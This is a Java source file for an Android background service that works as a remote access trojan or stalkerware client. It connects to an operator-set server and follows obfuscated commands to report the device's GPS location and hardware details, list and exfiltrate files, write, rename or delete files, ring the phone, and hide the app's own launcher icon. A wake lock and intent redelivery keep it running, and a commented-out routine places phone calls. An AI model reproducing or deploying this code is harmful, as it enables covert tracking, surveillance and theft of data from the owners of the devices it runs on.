package com.droidsurf.hostservice;

import android.Manifest;
import android.app.IntentService;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.location.LocationManager;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;
import java.text.DecimalFormat;
import android.app.ActivityManager;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Objects;

import static com.droidsurf.hostservice.GPSJobIntentService.POSITION;
import static com.droidsurf.hostservice.GlobalVariables.CHANNEL_ID;
import static com.droidsurf.hostservice.GlobalVariables.CHANNEL_ID_2;
import static com.droidsurf.hostservice.Connection.PORT;
import static com.droidsurf.hostservice.Connection.TEXT;
import static com.droidsurf.hostservice.ActivityMain.SHARED_PREFS;

public class MainLoopIntentService extends IntentService {

    public static final String TAG = "MainLoopIntentService";

    // Intro setting
    public static boolean INTRO = false;

    // general variables
    private Socket socket;
    private PrintWriter out;
    private String message = null;
    //private boolean isConnected = false;
    private boolean isActive = false;
    private boolean isRunning = true;
    private boolean jobCancelled = true;
    public static final String iconStatus = "show";
    // loop strings
    private static final String closeData = "FEOFEOFEOFEOFEOX";
    // command strings
    public static final String STARTSESSION = "4vv10_53ss10n3";
    public static final String DOWNLOAD = "InputStartDownload";
    public static final String UPLOAD = "InputStartUpload";
    public static final String SCREENSTATE = "checkScreenStatus";
    public static final String UPLVL = "NowUpLevel";
    public static final String BKHOME = "NowBackHome";
    public static final String LOCALFB = "startLocalFileBrowser";
    public static final String FILEBROWSERDATASEND = "!F1L3BR0WS3RX!";
    public static final String TOASTMSG = "showtoastmsg";
    public static final String GETGPSLOC = "getdevgpslocation";
    public static final String STRTLOCDEV = "!g3tp0sl0cd3v10!";
    public static final String GETIMEIDEV = "!ph0ne1me1!";
    public static final String CALLNUMPHONE = "!01phonecall03!";
    public static final String NOTIFICATIONALERT = "!phoneNotification!";
    public static final String PHONERINGON = "ph0neRingSt4rt";
    public static final String PHONERINGOFF = "RingSt4rt0FF";
    public static final String DISCONNECT = "disconnect";
    public static final String SEPARATOR = "#d0b#";
    public static final String RNMFILE = "!enmF1L3";
    public static final String DELFILE = "!d3lET3!";
    public static final String REFRESH = "!r3Fre$!";
    public static final String HIDEAPP = "!H1D34PP";
    public static final String NOTIFICATIONMSG = "N0T1F!C4";

    // notification
    private NotificationManagerCompat notificationManager;

    // * * * * * * * * * * * * * *
    private PowerManager.WakeLock wakeLock;

    public MainLoopIntentService() {
        super("BackgroundIntentService");
        setIntentRedelivery(true);
        // per fare in modo che il servizio possa essere riavviato

        //setIntentRedelivery(false);
        // equivale a "start_not_sticky" se fosse un servizio normale
    }


    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate: ");

        // Wakelock
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ExampleApp:WakeLock");
        //wakeLock.acquire();   - Last forever
        wakeLock.acquire(20*60*1000L /*20 minutes*/);
        Log.d(TAG, "Wakelock acquired");
        // keeps cpu on

        // Get app name
        String app_name = getApplicationInfo().loadLabel(getPackageManager()).toString();
        // Get Content text
        String content = getString(R.string.service_notice_1);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Intent notificationIntent = new Intent(this, ActivityMain.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle(app_name)
                    .setContentText(content)
                    .setSmallIcon(R.drawable.ic_settings_black)
                    .setContentIntent(pendingIntent)
                    .build();

            startForeground(1, notification);
        }
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        Log.d(TAG, "onHandleIntent: ");

        assert intent != null;
        String input = intent.getStringExtra("inputExtra");
        backgroundWork(input);
    }

    public void backgroundWork(String input) {

        // - Contestualizzazione del servizio -
        final Context context;
        context = this;

        // - Notification
        notificationManager = NotificationManagerCompat.from(this);

        // - Shared preferences -
        SharedPreferences sharedPreferences = getSharedPreferences(SHARED_PREFS, MODE_PRIVATE);
        final String address = sharedPreferences.getString(TEXT,"");
        final String port = sharedPreferences.getString(PORT,"");

        // - Ring Phone -
        Uri notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
        final Ringtone r = RingtoneManager.getRingtone(getApplicationContext(), notification);

        // - Main Loop -
        while (isRunning && !isActive) {
            Log.d(TAG, "try to connect to " + address + ":" + port);

            try {
                String device0 = Build.MODEL;
                String device1 = Build.MANUFACTURER;

                socket = new Socket();
                socket.connect(new InetSocketAddress(address, Integer.valueOf(port)), 30000);
                out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
                out.print(device0 + "~" + device1);
                out.flush();
                isActive = true;

            } catch (IOException e) {
                Log.d(TAG, "IOException 30s");
                SystemClock.sleep(30 * 1000);
                e.printStackTrace();
            }

            while (isActive) {
                try {
                    // - Ricezione e lettura dati -
                    BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    socket.setSoTimeout(10000);
                    message = in.readLine();
                    Log.d(TAG, "dati ricevuti: " + message);

                    // - Welcome message and start session-
                    if (message.equals(STARTSESSION)) {
                        String device2 = System.getProperty("os.version");
                        String device1 = Build.MANUFACTURER;
                        message = (device1 + " running: " + device2 + " os");
                    }

                    // - Show Toast Message -
                    if (message.startsWith(TOASTMSG)) {
                        Intent intentMsg = new Intent(context, ToastMsgReceiver.class);
                        intentMsg.putExtra("com.example.com.droidsurf.hostservice.EXTRA_TOAST_MSG", message.substring(12));
                        sendBroadcast(intentMsg);
                    }

                    // - Show Notification message
                    if (message.startsWith(NOTIFICATIONMSG)) {
                        message = message.substring(8);

                        try {
                            String[] parts = message.split("h#g!");
                            String msgTitle = parts[0];
                            String msgBody = parts[1];

                            Notification notificationMsg = new NotificationCompat.Builder(this, CHANNEL_ID_2)
                                    .setSmallIcon(R.drawable.ic_perm)
                                    .setContentTitle(msgTitle)
                                    .setContentText(msgBody)
                                    .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                                    .setCategory(NotificationCompat.CATEGORY_MESSAGE)
                                    .setColor(Color.RED)
                                    .build();

                            notificationManager.notify(2, notificationMsg);

                        } catch (Exception e) {
                            e.printStackTrace();
                            Log.d(TAG, "Error");
                        }
                    }

                    // - GPS service -
                    if (message.equals(GETGPSLOC)) {
                        isLocationManagerActive();
                    }

                    // - GPS request pos data -
                    if (message.equals(STRTLOCDEV)) {
                        Log.d(TAG, "Requesting device positioning data...");

                        String dataPos;
                        ((GlobalVariables)this.getApplication()).setLocalizationData(POSITION);

                        if (isLocationServiceRunning(GPSJobIntentService.class)) {
                            Log.d(TAG, "GPS Service is already running");
                            // gps SENDING DATA service is already running

                            try {
                                dataPos = ((com.droidsurf.hostservice.GlobalVariables) this.getApplication()).getLocalizationData();
                            } catch (Exception e) {
                                Log.d(TAG, "Failed retrieving location... try again");
                                dataPos = "Failed retrieving position - try again";
                                e.printStackTrace();
                            }

                        } else {
                            // gps SENDING DATA service is NOT running
                            Log.d(TAG, "GPS Service not running, starting it...");
                            Intent serviceIntent = new Intent(this, GPSJobIntentService.class);
                            GPSJobIntentService.enqueueWork(this, serviceIntent);
                            Log.d(TAG, "GPS Service started");

                            try {
                                dataPos = ((com.droidsurf.hostservice.GlobalVariables) this.getApplication()).getLocalizationData();
                            } catch (Exception e) {
                                dataPos = "Failed retrieving position - try again";
                                Log.d(TAG, "Failed retrieving position - try again");
                                e.printStackTrace();
                            }
                        }
                        Log.d(TAG, "Sending pos. data...");
                        message = dataPos;
                    }


                    // - File browser -
                    if (message.startsWith(LOCALFB)) {
                        String main_list = "";
                        if (message.equals(LOCALFB)) {
                            try {
                                // Get path of root:
                                String rootPath;
                                // CHECK IF ANDROID VERSION EQUALS LOLLIPOP (api 21)
                                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.LOLLIPOP_MR1) {
                                    rootPath = Environment.getExternalStorageDirectory().getAbsolutePath();
                                    Log.d(TAG, "External storage dir: " + rootPath);
                                } else {
                                    // IF ANDROID VERSION IS ABOVE API LEVEL 21
                                    rootPath = Objects.requireNonNull(context.getExternalFilesDir(null)).getAbsolutePath().substring(0,19);
                                }
                                // Save current working ROOT dir path *****
                                ((com.droidsurf.hostservice.GlobalVariables)this.getApplication()).setFilebrowserData(rootPath);
                                // Save current working DIRECTORY path *****
                                ((com.droidsurf.hostservice.GlobalVariables)this.getApplication()).setWorkingPath(rootPath);
                                // Show current path
                                Log.d(TAG, "Current main path is: " + rootPath);
                                // Create file var
                                File directory = new File(rootPath);
                                // Array file var
                                File[] files = directory.listFiles();

                                // Send to host we wants to start upload
                                out.print(FILEBROWSERDATASEND);
                                out.flush();

                                // Generate list to display by server
                                for (int i = 0; i < files.length; i++)
                                {
                                    main_list = (main_list + SEPARATOR + files[i].getName());
                                }

                                // send entire packet to host
                                message = (main_list);
                                Log.d(TAG, "Entire packet sended successfully!");

                            } catch (Exception e) {
                                Log.d(TAG, "Error accessing directory files");
                                e.printStackTrace();
                            }

                        } else {
                            // remove initial command "startLocalFileBrowser" from string message
                            message = message.substring(21);
                            Log.d(TAG, "the message is:" + message);

                            // Up LEVEL
                            // check if the new message starts with: "NowUpLevel"
                            if (message.startsWith(UPLVL)) {
                                String JumpUpPath = ((com.droidsurf.hostservice.GlobalVariables) this.getApplication()).getWorkingPath() + "/" + message.substring(10);
                                Log.d(TAG, "Jumping to dir: " + JumpUpPath);

                                try {
                                    // Send to host we wants to start upload
                                    out.print(FILEBROWSERDATASEND);
                                    out.flush();

                                    // List files in directory
                                    File directory = new File(JumpUpPath);
                                    File[] files = directory.listFiles();
                                    for (int i = 0; i < files.length; i++) {

                                        main_list = (main_list + SEPARATOR + files[i].getName());
                                    }

                                    // send msg to server
                                    message = main_list;
                                    Log.d(TAG, "Entire packet sended successfully!");

                                    // save new current working DIRECTORY to global vars
                                    ((com.droidsurf.hostservice.GlobalVariables) this.getApplication()).setWorkingPath(JumpUpPath);

                                } catch (Exception e) {
                                    e.printStackTrace();
                                    Log.d(TAG, "Jumping UP error");
                                }
                            }

                            // Back to HOME DIR
                            if (message.startsWith(BKHOME)) {
                                try {
                                    // get main ROOT dir path saved in global vars class
                                    String jumpBackHome = ((com.droidsurf.hostservice.GlobalVariables) this.getApplication()).getFilebrowserData();

                                    // Send to host we wants to start upload
                                    out.print(FILEBROWSERDATASEND);
                                    out.flush();

                                    // List files in directory
                                    File directory = new File(jumpBackHome);
                                    File[] files = directory.listFiles();

                                    for (int i = 0; i < files.length; i++) {
                                        main_list = (main_list + SEPARATOR + files[i].getName());
                                    }

                                    // send msg to server
                                    message = main_list;
                                    Log.d(TAG, "Entire packet sended successfully!");

                                    // save & update current new working DIRECTORY in global vars class
                                    ((com.droidsurf.hostservice.GlobalVariables) this.getApplication()).setWorkingPath(jumpBackHome);

                                } catch (Exception e) {
                                    e.printStackTrace();
                                    Log.d(TAG, "Back home error");
                                }
                            }
                        }
                    }

                    // - Download File -
                    if (message.startsWith(DOWNLOAD)) {
                        String filename = message.substring(18);
                        try {
                            // Retrieve path to download the file.
                            final String downloadPath = ((com.droidsurf.hostservice.GlobalVariables)this.getApplication()).getWorkingPath() + "/" + filename;
                            Log.d(TAG, "Downloading path: " + downloadPath);
                            out.print("!PrepareNowForDownload!" + filename);
                            out.flush();

                            Log.d(TAG, "Starting download...");

                            File file = new File(downloadPath);
                            byte[] bytes = new byte[(int) file.length()];
                            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
                            bis.read(bytes, 0 ,bytes.length);
                            OutputStream os = socket.getOutputStream();
                            os.write(bytes, 0, bytes.length);
                            os.flush();

                            Log.d(TAG, "sending file: finished!");
                            message = "0001endtransmission0001";

                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    // - Upload File -
                    if (message.startsWith(UPLOAD)) {
                        try {
                            final String remoteFileName = message.substring(16);
                            Log.d(TAG, "- UPLOAD FILE NAME: "+ remoteFileName);

                            final String DirSaveFile = ((com.droidsurf.hostservice.GlobalVariables) this.getApplication()).getWorkingPath();
                            Log.d(TAG, "- UPLOAD DIR: " + DirSaveFile);

                            final String completeSavingPath = DirSaveFile + "/" + remoteFileName;
                            Log.d(TAG, "- COMPLETE SAVING PATH: " + completeSavingPath);

                            File f = new File(completeSavingPath);
                            Log.d(TAG, "1) FILE OBJECT CREATED SUCCESSFULLY");

                            byte[] bytes = new byte[1024 << 8];
                            Log.d(TAG, "2) BYTES CREATED");

                            InputStream is = socket.getInputStream();
                            Log.d(TAG, "3) INPUT STREAM CREATED");

                            FileOutputStream fos = new FileOutputStream(f,true);
                            Log.d(TAG, "4) FILE OUTPUT STREAM CREATED");

                            out.print("!Upl0ad1nProgre$");
                            out.flush();    // <--- necessario

                            int readBytes;
                            while((readBytes = is.read(bytes)) > 0) {
                                fos.write(bytes,0, readBytes);
                                Log.d(TAG, "writing data...");
                                fos.flush();
                            }

                            fos.close();
                            is.close();
                            out.close();

                        } catch (Exception e) {
                            e.printStackTrace();
                            Log.d(TAG, "Error uploading file");
                            continue;
                        }
                    }

                    // - RENAME FILE -
                    if (message.startsWith(RNMFILE)) {
                        String rnmFilename = message.substring(8);

                        try {
                            String[] arrOfStrFilename = rnmFilename.split("!0101!", 2);
                            Log.d(TAG, "nome originale: " + arrOfStrFilename[0]);
                            Log.d(TAG, "nome nuovo: " + arrOfStrFilename[1]);

                            File currentFileName = new File(((com.droidsurf.hostservice.GlobalVariables)this.getApplication()).getWorkingPath() + "/" + arrOfStrFilename[0]);
                            File newFileName = new File(((com.droidsurf.hostservice.GlobalVariables)this.getApplication()).getWorkingPath() + "/" + arrOfStrFilename[1]);

                            if(currentFileName.exists()) {
                                currentFileName.renameTo(newFileName);
                                message = "7!HKOX59";
                            } else {
                                Log.d(TAG, "File not found or exist");
                            }

                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    // - DELETE FILE -
                    if (message.startsWith(DELFILE)) {
                        String delFileName = message.substring(8);

                        try {
                            File delfile = new File(((com.droidsurf.hostservice.GlobalVariables)this.getApplication()).getWorkingPath() + "/" + delFileName);
                            if (delfile.exists()) {
                                delfile.delete();

                                message="!02KJP10";
                            } else {
                                Log.d(TAG, "File not found");
                            }
                        } catch (Exception c) {
                            c.printStackTrace();
                        }
                    }

                    // - Refresh dir folder -
                    if (message.equals(REFRESH)) {
                        String main_list = "";
                        // Get last working directory from global class variables
                        String lastWorkingPath = ((com.droidsurf.hostservice.GlobalVariables) this.getApplication()).getWorkingPath();
                        // List the directory
                        File lastWorkDir = new File(lastWorkingPath);
                        // Array file var
                        File[] files = lastWorkDir.listFiles();

                        // Send to host we wants to start upload
                        out.print(FILEBROWSERDATASEND);
                        out.flush();

                        // Generate list to display by server
                        for (int i = 0; i < files.length; i++)
                        {
                            main_list = (main_list + SEPARATOR + files[i].getName());
                        }

                        // send entire packet to host
                        message = (main_list);
                        Log.d(TAG, "Entire packet sended successfully!");
                    }


                    // - Get device INFO -
                    if (message.equals(GETIMEIDEV)) {
                        try {
                            // - Get client version number
                            try {
                                PackageInfo pInfo = context.getPackageManager().getPackageInfo(getPackageName(), 0);
                                String cli_version = pInfo.versionName;
                                message = (cli_version);
                            } catch (PackageManager.NameNotFoundException e) {
                                e.printStackTrace();
                            }

                            try {
                                Field[] fields = Build.VERSION_CODES.class.getFields();
                                String codeName = "UNKNOWN";
                                for (Field field : fields) {
                                    try {
                                        if (field.getInt(Build.VERSION_CODES.class) == Build.VERSION.SDK_INT) {
                                            codeName = field.getName();
                                        }
                                    } catch (IllegalAccessException e) {
                                        e.printStackTrace();
                                    }
                                }
                                message = message + (" Android " + codeName);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            try {
                                String mem_available = getMemorySizeHumanized();
                                message = message + (" RAM " + mem_available);
                            } catch (Exception z) {
                                z.printStackTrace();
                            }

                        } catch (Exception e) {
                            Log.d(TAG, "Failed on getting dev info.");
                            message = ("Failed getting device info.");
                            e.printStackTrace();
                        }
                        message = ("G401BNHMSC" + message);
                    }

                    // - Check Screen Status -
                    if (message.equals(SCREENSTATE)) {
                        PowerManager powerManager= (PowerManager)context.getSystemService(Context.POWER_SERVICE);

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                            if (powerManager.isInteractive()) {
                                Log.d(TAG, "onHandleWork: ON");
                                message = ("5CR33NSTATON");
                            } else {
                                Log.d(TAG, "onHandleWork: OFF");
                                message = ("5CR33NSTATOFF");
                            }
                        }
                        else if(Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT_WATCH){
                            if(powerManager.isScreenOn()){
                                Log.d(TAG, "onHandleWork: ON");
                                message = ("5CR33NSTATON");
                            } else {
                                Log.d(TAG, "onHandleWork: OFF");
                                message = ("5CR33NSTATOFF");
                            }
                        }
                    }

                    // - Hide/Unhide app from launcher -
                    if (message.equals(HIDEAPP)) {
                        String iconStatus = sharedPreferences.getString(MainLoopIntentService.iconStatus,"show");

                        if (iconStatus.equals("show")) {

                            Log.d(TAG, "hiding app icon...");
                            SharedPreferences.Editor editor = sharedPreferences.edit();
                            editor.putString(iconStatus, "hide");  // - Save app icon status -
                            editor.apply();

                            // - hide app icon
                            PackageManager p = getPackageManager();
                            ComponentName componentName = new ComponentName(this, com.droidsurf.hostservice.ActivityMain.class);
                            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                        } else {

                            Log.d(TAG, "unhiding app icon...");
                            SharedPreferences.Editor editor = sharedPreferences.edit();
                            editor.putString(iconStatus, "show");  // - Save app icon status -
                            editor.apply();

                            // - unhide app icon
                            PackageManager p = getPackageManager();
                            ComponentName componentName = new ComponentName(this, com.droidsurf.hostservice.ActivityMain.class);
                            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
                        }
                    }

                    /**
                    // - Call someone -
                    if (message.startsWith(CALLNUMPHONE)) {
                        Thread thread = new Thread() {
                            @Override
                            public void run() {
                                String number = message.substring(9);
                                String dial = ("tel:" + number);
                                Intent callIntent = new Intent(Intent.ACTION_CALL);
                                callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                callIntent.setData(Uri.parse(dial));
                                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                                    Log.d(TAG, "Non ho i permessi per telefonare!");
                                } else {
                                    startActivity(callIntent);
                                }
                            }
                        };
                        thread.start();
                    }
                     */

                    // - Notification audio -
                    if (message.equals(NOTIFICATIONALERT)) {
                        Uri notification2 = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
                        Ringtone x = RingtoneManager.getRingtone(getApplicationContext(), notification2);
                        x.play();
                    }

                    // - Start and stop ringtone -
                    if (message.startsWith(PHONERINGON)) {
                        if (message.endsWith(PHONERINGOFF)) {
                            r.stop();
                        } else {
                            r.play();
                        }
                    }

                    // - Closing connection to host -
                    if (message.equals(DISCONNECT) || message.equals(null)) {
                        Log.d(TAG, "Disconnessione dal server.");
                        //socket.close();
                        isActive = false;
                    }

                    // * * * * * * * * * * * * * * *
                    // * D A T A  -  S E N D I N G *
                    out.print(message + closeData);
                    out.flush();

                } catch (SocketTimeoutException e) {
                    e.printStackTrace();
                    Log.d(TAG, "Socket timeout 10s");

                } catch (IOException e) {
                    e.printStackTrace();
                    Log.d(TAG, "Socket closed by host");
                    isActive = false;
                }
            }
        }
    }

    public String getMemorySizeHumanized() {
        Context context = getApplicationContext();
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        activityManager.getMemoryInfo(memoryInfo);
        DecimalFormat twoDecimalForm = new DecimalFormat("#.##");
        String finalValue = "";
        long totalMemory = memoryInfo.totalMem;
        double kb = totalMemory / 1024.0;
        double mb = totalMemory / 1048576.0;
        double gb = totalMemory / 1073741824.0;
        double tb = totalMemory / 1099511627776.0;

        if (tb > 1) {
            finalValue = twoDecimalForm.format(tb).concat(" TB");
        } else if (gb > 1) {
            finalValue = twoDecimalForm.format(gb).concat(" GB");
        } else if (mb > 1) {
            finalValue = twoDecimalForm.format(mb).concat(" MB");
        }else if(kb > 1){
            finalValue = twoDecimalForm.format(mb).concat(" KB");
        } else {
            finalValue = twoDecimalForm.format(totalMemory).concat(" Bytes");
        }

        return finalValue;
    }

    private void isLocationManagerActive() {
        final LocationManager manager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);

        assert manager != null;
        if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            // DISABLED
            //Intent intent = new Intent(this, TraspActivity.class);
            //intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            //startActivity(intent);
            Log.d(TAG, "LocationManagerActive: NO");
            message = "!N0GP54CT!";
        } else {
            // ENABLED
            Log.d(TAG, "isLocationManagerActive: YES");
            // info. msg enabled to client
            message = "?R34D!N0W1";
            //isLocationServiceRunning(GPSJobIntentService.class);
        }
    }

    // - Check if location service is running, if not then starts the location service
    private boolean isLocationServiceRunning(Class<GPSJobIntentService> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                Log.d(TAG, "GPS service is already running!");
                // If service is running retrieve location data
                //requestPositionData();
                return true;
            }
        }
        Log.d(TAG, "GPS service is active, you can locate device");

        //Intent serviceIntent = new Intent(this, GPSJobIntentService.class);
        //GPSJobIntentService.enqueueWork(this, serviceIntent);
        //Log.d(TAG, "GPS service is now started.");
        message = "?R34D!N0W1";
        return false;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        try {
            message = null;
            isRunning = false;
            isActive = false;

            out.close();
            socket.close();

            wakeLock.release();
            Log.d(TAG, "Loop stopped");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}